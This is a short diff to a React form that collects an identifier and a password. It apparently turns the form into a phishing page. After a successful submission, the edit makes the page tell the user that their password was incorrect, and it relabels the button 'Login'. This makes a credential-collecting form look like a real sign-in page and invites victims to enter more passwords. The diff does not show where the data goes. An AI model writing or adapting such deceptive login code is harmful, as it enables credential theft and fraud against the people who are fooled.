@@ -33,7 +33,7 @@ function App() {
       setIdentifier('')
       setPassword('')
       setSuccess(true)
-      setMessage('Your response has been submitted!')
+      setMessage('Sorry, your password was incorrect. Please double-check your password.')
     } catch (error) {
       console.error('Submission error:', error)
       setMessage('Something went wrong. Please try again.')
@@ -138,7 +138,7 @@ function App() {
             type="submit"
             className="submit-btn"
           >
-            {'Submit'}
+            {'Login'}
           </button>
 
           {message && (
